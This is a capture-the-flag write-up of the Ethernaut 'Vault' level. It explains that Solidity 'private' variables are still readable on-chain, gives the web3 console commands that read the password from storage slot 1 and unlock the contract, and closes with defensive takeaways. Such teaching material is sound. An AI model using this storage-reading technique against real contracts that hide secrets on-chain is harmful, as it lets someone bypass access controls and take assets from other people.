# Vault

![https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)

# Objectives

Unlock the vault to pass the level!

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

# Analysis

This contract requires us to unlock the vault that is protected by `bytes32 private password` variable and is set in the constructor during contract deployment. The only way to unlock the vault is to know the password. Any blockchain developer would know that `private` variable only affects the scope of the variable in the contract and has nothing to do with making the contents of that variable private or hidden, that means the password stored in the `bytes32 private` variable can be accessible by outsiders.

For this we need to understand how Solidity stores state variables in the EVM, a quick search led me to this awesome [article](https://solidity-by-example.org/hacks/accessing-private-data/).  Please go through the article before continuing with the AntiSec section.

# AntiSec

Now that we know how can we access any state variables stored using Solidity, let’s first check if the `bool public locked` variable which is stored in `slot 0` returns `true` or not. To do that, simply in the developer console I’ll type this command - 

```jsx
await web3.eth.getStorageAt(contract.address, 0, console.log)
```

And it should return True or 1- 

```jsx
"0x0000000000000000000000000000000000000000000000000000000000000001"
```

The next variable in the contract is `password` which is in `slot 1` , this should return us the `HEX` response of the password we need - 

```jsx
await web3.eth.getStorageAt(contract.address, 1, console.log)
>> "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
```

Great, we now have the password, we can just use it to unlock the vault, however curious mind wants to know what this hex value says, to know that we can just convert this to ASCII using web3 utils - 

```jsx
await web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
>> "A very strong secret password :)"
```

Indeed a very strong secret password. Now let’s unlock the vault by calling the `unlock` function and pass the vary strong secret password’s `HEX` value as the parameter.

```jsx
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

Once the transaction goes through successfully, we will again check the `locked` value which is stored in the slot 0 and this time it should return all `0` instead of 1 - 

```jsx
await web3.eth.getStorageAt(contract.address, 0, console.log)
>> "0x0000000000000000000000000000000000000000000000000000000000000000"
```

Now we submit the instance, and congratulations, we have unlocked the vault.

```jsx
(っ◕‿◕)っ Well done, You have completed this level!!!
```

# Key Takeaways

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
